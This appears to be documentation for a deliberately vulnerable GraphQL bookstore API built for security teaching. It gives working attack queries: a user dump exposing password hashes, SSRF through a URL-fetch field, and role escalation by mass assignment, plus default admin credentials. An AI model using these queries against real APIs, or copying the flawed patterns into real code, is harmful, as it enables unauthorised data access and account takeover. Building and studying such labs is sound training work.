# GraphQL Introspection Queries - Vulnerable Bookstore API

## Full Introspection Query

**Query:**
```graphql
{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
    mutationType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

**Response:**
```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query",
        "fields": [
          {
            "name": "me",
            "description": "Get current authenticated user"
          },
          {
            "name": "books",
            "description": "List all books with optional search and category filter"
          },
          {
            "name": "book",
            "description": "Get a specific book by ID"
          },
          {
            "name": "_internalUserSearch",
            "description": "Search users by username pattern (internal)"
          },
          {
            "name": "_fetchExternalResource",
            "description": "Fetch external resource by URL (SSRF)"
          }
        ]
      },
      "mutationType": {
        "name": "Mutation",
        "fields": [
          {
            "name": "register",
            "description": "Register a new user"
          },
          {
            "name": "login",
            "description": "Login and get JWT token"
          },
          {
            "name": "updateProfile",
            "description": "Update user profile"
          }
        ]
      }
    }
  }
}
```

## Available Queries

### Public Queries (No Authentication)
1. **books** - List all books
   - Optional args: `search`, `categoryId`
   - Returns: Array of Book objects

2. **book(id: ID!)** - Get specific book
   - Required arg: `id`
   - Returns: Book object or null

3. **_internalUserSearch(username: String!)** ⚠️ VULNERABLE
   - Search all users by username pattern
   - Returns: Array of User objects (includes passwordHash!)

4. **_fetchExternalResource(url: String!)** ⚠️ VULNERABLE
   - Fetch external URL (SSRF)
   - Returns: String content from URL

### Authenticated Queries (Requires JWT)
1. **me** - Get current user
   - Returns: User object
   - Requires: Authorization: Bearer <token> header

## Available Mutations

1. **register(username, firstName, lastName, password)**
   - Creates new user account
   - Returns: success, message, token, user

2. **login(username, password)**
   - Authenticates user
   - Returns: success, message, token, user

3. **updateProfile(...)** ⚠️ VULNERABLE
   - Updates user profile
   - VULNERABLE: Accepts `role` field for privilege escalation!

## Working Examples

### List All Books
```graphql
query {
  books {
    id
    title
    price
    stockQuantity
  }
}
```

### Get Specific Book
```graphql
query {
  book(id: 1) {
    id
    title
    description
    price
  }
}
```

### BOLA Attack - Get All Users
```graphql
query {
  _internalUserSearch(username: "") {
    id
    username
    passwordHash
    role
  }
}
```

### SSRF Attack
```graphql
query {
  _fetchExternalResource(url: "http://example.com")
}
```

### Register User
```graphql
mutation {
  register(
    username: "newuser123",
    firstName: "John",
    lastName: "Doe",
    password: "password123"
  ) {
    success
    message
    token
    user {
      id
      username
      role
    }
  }
}
```

### Login
```graphql
mutation {
  login(
    username: "admin",
    password: "password123"
  ) {
    success
    message
    token
    user {
      id
      username
      role
    }
  }
}
```

### Mass Assignment - Privilege Escalation
```graphql
mutation {
  updateProfile(
    username: "yourusername",
    role: "admin"
  ) {
    id
    username
    role
  }
}
```

### Authenticated Query (with token)
```graphql
query {
  me {
    id
    username
    role
    passwordHash
  }
}
```
**Headers:** `Authorization: Bearer <your-jwt-token>`

## Default Test Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | password123 | admin |
| staff | password123 | staff |
| user | password123 | user |

## Security Vulnerabilities

1. **BOLA** - `_internalUserSearch` accessible without auth, returns all users
2. **Excessive Data Exposure** - `passwordHash` field exposed in all user queries
3. **Mass Assignment** - `updateProfile` accepts `role` field for privilege escalation
4. **SSRF** - `_fetchExternalResource` makes real HTTP requests
5. **Broken Authentication** - Weak JWT secret, no token expiration

## Important Notes

- This is a custom GraphQL implementation (not using Apollo/graphql-js)
- Introspection returns static schema information
- All queries are parsed with string matching
- Vulnerable by design for security education
- No input validation on mutation arguments
